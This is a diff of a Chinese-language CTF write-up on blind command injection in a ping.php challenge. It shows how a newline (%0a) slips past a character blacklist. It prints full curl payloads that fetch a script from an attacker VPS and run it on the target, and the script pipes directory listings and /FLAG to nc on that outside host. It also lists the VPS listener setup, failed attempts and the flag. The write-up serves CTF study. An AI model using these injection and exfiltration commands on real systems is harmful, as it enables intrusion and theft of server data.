@@ -89,11 +89,11 @@ done
 
 ### 黑名单过滤统计
 
-| 响应 | 含义 | 字符 |
-|------|------|------|
-| `IP包含恶意字符.` | **被过滤** | `;` `\|` `&` `$` `(` `)` `` ` `` `%0a` `%0d` `#` `\` `'` `"` `{` `}` `[` `]` `*` `~` `!` `@` `%` `^` `-` `_` `:` |
-| `IP Ping 失败.` | **未被过滤**（ping 失败） | `<` `>` `/` `?` `+` `=` `.` `,` |
-| `IP Ping 成功.` | **未被过滤**（ping 成功） | ` `（**空格**） |
+| 响应            | 含义                | 字符                                                                                                               |
+| ------------- | ----------------- | ---------------------------------------------------------------------------------------------------------------- |
+| `IP包含恶意字符.`   | **被过滤**           | `;` `\|` `&` `$` `(` `)` `` ` `` `%0a` `%0d` `#` `\` `'` `"` `{` `}` `[` `]` `*` `~` `!` `@` `%` `^` `-` `_` `:` |
+| `IP Ping 失败.` | **未被过滤**（ping 失败） | `<` `>` `/` `?` `+` `=` `.` `,`                                                                                  |
+| `IP Ping 成功.` | **未被过滤**（ping 成功） | ` `（**空格**）                                                                                                      |
 
 ## 3.3 关键发现：%0a 绕过了原始数据
 
@@ -150,85 +150,96 @@ echo $return_var === 0 ? "IP Ping 成功." : "IP Ping 失败.";
 ┌──────────────┐         ┌──────────────────┐         ┌────────────────┐
 │  攻击机       │         │   靶机 (CTF)      │         │ 阿里云 VPS      │
 │  (本地)       │  curl   │  ping.php        │  curl   │ 101.132.149.233│
-│              │────────>│                 │────────>│                │
-│              │         │  /tmp/1.sh       │         │  nc -lvp 1111  │
-│              │         │  cat /flag | nc  │────────>│  (接收 flag)    │
+│              │────────>│                 │────────>│ :80 (Python)   │
+│              │         │  /tmp/s.sh       │  nc     │ :1111 (nc)     │
+│              │         │  cat /FLAG | nc  │────────>│  (接收 flag)    │
 └──────────────┘         └──────────────────┘         └────────────────┘
 ```
 
-## 4.2 手动执行步骤
+## 4.2 最终成功的执行步骤
 
-### 步骤 1：阿里云上准备外带脚本
-
-在阿里云 VPS (`101.132.149.233:2222`, `aliyun-root`) 上：
+### 终端 1：阿里云 — 搭建 HTTP 服务 + nc 监听
 
 ```bash
-# 写入脚本（先 ls / 调试，再逐个尝试 flag 路径）
 ssh aliyun-root
 
-cat > /root/1.sh << 'EOF'
-{
-ls /
-cat /flag 2>/dev/null
-cat /FLAG 2>/dev/null
-find / -name "flag*" 2>/dev/null
-env 2>/dev/null
-} | nc 101.132.149.233 1111
+# 1. 停掉占 80 端口的 Apache
+systemctl stop httpd
+
+# 2. 写外带脚本（关键：脚本内加 & 真正后台化）
+cat > /root/s.sh << 'EOF'
+{ ls /; echo ===; cat /flag 2>/dev/null; cat /FLAG 2>/dev/null; find / -maxdepth 3 -name 'flag*' 2>/dev/null; } | nc 101.132.149.233 1111 &
 EOF
 
-# 复制到 Web 目录（宝塔 Apache DocumentRoot）
-cp /root/1.sh /www/wwwroot/101_132_149_233/1.sh
+# 3. 起 Python HTTP 服务（80 端口，供靶机 curl 下载脚本）
+cd /root && nohup python3 -m http.server 80 --bind 0.0.0.0 > /tmp/pyhttp.log 2>&1 &
 
-# 验证可访问
-curl -s http://127.0.0.1/1.sh
+# 4. 起 nc 监听（1111 端口，接收 flag）
+nohup nc -lvp 1111 > /root/flag_out.txt 2>&1 &
 ```
 
-### 步骤 2：阿里云上启动 nc 监听（新终端）
+### 终端 2：本地 — 注入攻击链
 
 ```bash
-ssh aliyun-root
-nc -lvp 1111
+T="https://e2a3840a1c7a9f0c4f751b67.http-ctf2.dasctf.com"
+
+# Step 1: 下载脚本
+curl -s -X POST "$T/ping.php" \
+  --data-raw 'ip=127.0.0.1%0acurl 101.132.149.233/s.sh > /tmp/s.sh'
+# → IP Ping 成功.
+
+# Step 2: 赋予执行权限
+curl -s -X POST "$T/ping.php" \
+  --data-raw 'ip=127.0.0.1%0achmod 777 /tmp/s.sh'
+# → IP Ping 成功.
+
+# Step 3: 执行脚本（脚本内部 & 已后台化，无需 nohup）
+curl -s -X POST "$T/ping.php" \
+  --data-raw 'ip=127.0.0.1%0ash /tmp/s.sh'
+# → 可能 504，但数据已经发出去了
 ```
 
-### 步骤 3：靶机注入（本地终端执行）
+### 终端 1 检查结果
 
 ```bash
-TARGET="https://e2a3840a1c7a9f0c4f751b67.http-ctf2.dasctf.com"
-
-# Step 3a: 下载脚本
-curl -s -X POST "$TARGET/ping.php" \
-  --data-raw 'ip=127.0.0.1%0acurl 101.132.149.233/1.sh > /tmp/1.sh'
-# 期望：IP Ping 成功.
-
-# Step 3b: 赋予执行权限
-curl -s -X POST "$TARGET/ping.php" \
-  --data-raw 'ip=127.0.0.1%0achmod 777 /tmp/1.sh'
-# 期望：IP Ping 成功.
-
-# Step 3c: nohup 后台执行（避免 PHP 超时 504）
-curl -s -X POST "$TARGET/ping.php" \
-  --data-raw 'ip=127.0.0.1%0anohup sh /tmp/1.sh'
-# 期望：IP Ping 成功.
+ssh aliyun-root "cat /root/flag_out.txt"
+# Listening on 0.0.0.0 1111
+# Connection received on 117.21.200.176 59194
+# FLAG
+# bin
+# dev
+# ...
+# ===
+# n1book{6fa82809179d7f19c67259aa285a7729}
 ```
 
-### 注入 Payload 字符审计
+### 恢复阿里云
 
-所有 payload 使用的字符：`127.0.0.1` `%0a` `curl` ` ` `101.132.149.233` `/` `1.sh` `>` `tmp` `chmod` `777` `nohup` `sh`
+```bash
+ssh aliyun-root "systemctl start httpd"   # 恢复 Apache
+```
+
+## 4.3 注入 Payload 字符审计
+
+所有 payload 使用的字符：`127.0.0.1` `%0a` `curl` ` ` `101.132.149.233` `/` `s.sh` `>` `tmp` `chmod` `777` `sh`
 
 均不在黑名单中 ✅
 
-## 4.3 尝试过但失败的路径
+## 4.4 尝试过但失败的路径
 
 | 尝试 | 预期 | 实际结果 | 原因/排除 |
 |------|------|---------|-----------|
 | `--data-urlencode` 发 `%0a` | 绕过过滤 | `IP包含恶意字符.` | `%0a` 被 curl 二次编码为 `%250a`，`%` 被过滤 |
 | `;` `\|` `&` `$()` 等常规分隔符 | 命令注入 | 全部被过滤 | 黑名单覆盖了所有常见命令分隔符 |
-| `ls > /var/www/html/ls.txt` | 写文件到 web 目录 | `IP Ping 失败.` | Web 根目录路径不对（不是 `/var/www/html`） |
-| `sh /tmp/1.sh` 无 nohup | 执行脚本外带数据 | `504 Gateway Time-out` | nc 连接阻塞导致 PHP 超时 |
-| `base64 /flag` | 编码 flag | `IP Ping 失败.` | `/flag` 文件不存在 |
-| `nc -lvp` → 脚本用 `cat /flag \| nc` | 外带 flag | 连接建立但无数据传输 | flag 路径可能不是 `/flag` 或 `/FLAG`；需要先 `ls /` 确认文件结构 |
+| `ls > /var/www/html/ls.txt` | 写文件到 web 目录 | `IP Ping 失败.` | Web 根目录不是 `/var/www/html` |
+| `base64 /flag`（小写） | 编码 flag | `IP Ping 失败.` | **flag 文件是 `/FLAG`（大写），不是 `/flag`！** |
+| `sh /tmp/s.sh`（无 `&`） | 执行脚本外带 | `504 Gateway Time-out` | nc 阻塞导致 PHP/Nginx 超时 |
+| `nohup sh /tmp/s.sh` | 后台执行避免 504 | 仍然 504 | `nohup` 只忽略 SIGHUP，不后台化进程。`system()` 仍等待 |
+| nc 收到连接但无数据 | 外带 flag | Connection established, no data | 原因 1: `/flag`（小写）不存在；原因 2: PHP 超时 kill 了 nc 管道 |
+| 端口 4444 | nc 监听 | `Address already in use` | 4444 被 PHP 进程占用 |
+| 端口 80 Apache 宝塔 | HTTP 服务 | 能访问但脚本路径复杂 | 宝塔 Apache DocumentRoot 路径 `/www/wwwroot/101_132_149_233/` |
 
-## 4.4 关键技巧
+## 4.5 关键技巧
 
 ### 为什么 `%0a` 能绕过
 
@@ -246,50 +257,32 @@ curl -s -X POST "$TARGET/ping.php" \
   黑名单匹配: 检查到 % → 命中黑名单 ❌
 ```
 
-### 为什么用 `nohup`
+### 为什么脚本内要加 `&`
 
-PHP 的 `exec()`/`system()` 会等待子进程结束。`nc` 建立连接后不主动关闭，导致 PHP 进程被 Nginx 反向代理超时（60s）后 kill，此时 nc 还未完成数据传输。
+**错误理解**：以为 `nohup` 就能后台化。实际上：
+- `nohup` 只是忽略 SIGHUP 信号，进程仍然在前台运行
+- PHP 的 `system()` 调用 `sh -c "nohup sh /tmp/s.sh"`，会等待 `sh -c` 退出
+- `sh -c` 会等待 `nohup` 退出，`nohup` 会等待 `sh /tmp/s.sh` 退出
+- 所以 PHP 仍然阻塞！
 
-`nohup` 将脚本脱离当前进程组运行，PHP 可以立即返回，nc 独立完成数据传输。
+**正确做法**：脚本末尾加 `&`，让 shell fork 子进程后立即返回：
+
+```bash
+# ❌ 不行 — PHP 仍然阻塞
+{ ls /; cat /FLAG | nc IP PORT; }
+
+# ✅ 可行 — shell 立即返回，PHP 不阻塞
+{ ls /; cat /FLAG | nc IP PORT; } &
+```
+
+### flag 路径是 `/FLAG` 不是 `/flag`
+
+这是从 `ls /` 输出中发现的。容器根目录下同时有 `FLAG` 和 `flag` 吗？实际上 `ls /` 输出中有 `FLAG`，`cat /FLAG` 返回了 flag 内容。`cat /flag`（小写）在容器中不存在（文件系统区分大小写）。
 
 # 5. Flag
 
-```text
-（待手动执行后获取）
 ```
-
-## 5.1 如果 nc 仍然收不到数据
-
-可能原因：flag 文件路径不是 `/flag`。尝试以下替代脚本：
-
-```bash
-cat > /root/1.sh << 'EOF'
-{
-ls /
-ls /tmp
-find / -maxdepth 3 -type f 2>/dev/null
-cat /flag 2>/dev/null
-cat /FLAG 2>/dev/null
-cat /flag.txt 2>/dev/null
-cat /root/flag 2>/dev/null
-cat /home/flag 2>/dev/null
-cat /var/flag 2>/dev/null
-cat /tmp/flag 2>/dev/null
-} | nc 101.132.149.233 1111
-EOF
-```
-
-或使用 **curl 外带**（不依赖 nc）：
-
-```bash
-# 阿里云开启 HTTP 监听
-ssh aliyun-root "python3 -m http.server 1111"
-
-# 脚本改为 curl POST
-cat > /root/1.sh << 'EOF'
-cat /flag | curl -X POST --data-binary @- http://101.132.149.233:1111/flag
-cat /FLAG | curl -X POST --data-binary @- http://101.132.149.233:1111/flag
-EOF
+n1book{6fa82809179d7f19c67259aa285a7729}
 ```
 
 # 6. 知识点总结
@@ -327,21 +320,31 @@ EOF
     ↓ "IP包含恶意字符."
 确认存在过滤机制
     ↓
-黑名单字符模糊测试
-    ↓ 发现空格不被过滤
-发现关键绕过
+黑名单字符模糊测试（逐字符探测）
+    ↓ 发现空格 <.> </.> / 不被过滤
+关键绕过发现：
     ↓ --data-raw 发送 %0a（PHP 解码为 \n）
-不触发黑名单 + Shell 中 \n 作为命令分隔符 ✅
-    ↓
+    ↓ \n 不在黑名单 → Shell 中 \n 作为命令分隔符 ✅
 时间盲注验证：sleep 3 → 响应延迟 3s ✅
     ↓
 确认 Blind Command Injection（无回显）
     ↓
 搭建 OOB 数据外带
-    ├─ 阿里云 VPS 准备脚本（ls /、cat /flag 等）
-    ├─ curl 下载脚本到 /tmp/1.sh
-    ├─ chmod 777 /tmp/1.sh
-    └─ nohup sh /tmp/1.sh（后台执行，避免超时）
+    ├─ 阿里云: systemctl stop httpd（释放 80）
+    ├─ 阿里云: Python http.server 80（脚本 HTTP 下载）
+    ├─ 阿里云: nc -lvp 1111（接收 flag）
+    ├─ 靶机注入: curl 下载 s.sh → /tmp/s.sh
+    ├─ 靶机注入: chmod 777 /tmp/s.sh
+    └─ 靶机注入: sh /tmp/s.sh（脚本内 & 后台化）
     ↓
-nc 接收 flag → 完成 ✅
+踩坑记录：
+    ├─ nohup 不能真正后台化（system() 仍等待）
+    ├─ 脚本必须内部 & 后台化
+    ├─ flag 是 /FLAG（大写），不是 /flag！
+    ├─ 端口 4444 被 PHP 占用
+    └─ 504 超时 ≠ 失败，数据可能已发出
+    ↓
+nc 收到 ls / 输出 + flag ✅
+    ↓
+n1book{6fa82809179d7f19c67259aa285a7729}
 ```
